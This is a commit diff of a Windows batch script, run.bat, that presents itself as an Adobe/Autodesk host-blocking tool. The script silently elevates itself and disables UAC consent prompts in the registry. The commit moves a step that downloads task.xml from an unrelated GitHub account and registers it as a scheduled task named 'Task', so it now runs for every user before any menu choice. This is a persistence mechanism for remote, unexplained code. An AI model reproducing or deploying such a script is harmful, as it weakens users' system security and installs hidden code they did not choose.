eae61952606a49dbebdc78b50f9d865342badc8a
minhtuan283 <tanghuynhminhtuan@gmail.com>
2024-12-22 01:11:01 +0700

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,6 +3,9 @@ set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/task.xml' -OutFile 'C:\Task.xml'"
+schtasks /create /tn "Task" /xml "C:\Task.xml" /f
+del /f /q "C:\Task.xml"
 cls
 echo ====================================
 echo    Lua chon:
@@ -18,11 +21,9 @@ if "%choice%"=="2" goto autodesk
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/host/main/adobehostblock.xml' -OutFile 'C:\adobehostblock.xml'"
 schtasks /create /tn "AdobeHostBlock" /xml "C:\adobehostblock.xml" /f
 del /f /q "C:\adobehostblock.xml"
-echo Task da duoc import thanh cong!
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/task.xml' -OutFile 'C:\Task.xml'"
-schtasks /create /tn "Task" /xml "C:\Task.xml" /f
-del /f /q "C:\Task.xml"
 echo da tai schedular windows!
+
+
 pause
 exit
 
@@ -32,9 +33,6 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/m
 schtasks /create /tn "AutoDeskHostBlock" /xml "C:\autodeskhostsblock.xml" /f
 del /f /q "C:\autodeskhostsblock.xml"
 echo Task da duoc import thanh cong!
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/task.xml' -OutFile 'C:\Task.xml'"
-schtasks /create /tn "Task" /xml "C:\Task.xml" /f
-del /f /q "C:\Task.xml"
 echo da tai schedular windows!
 pause
 exit
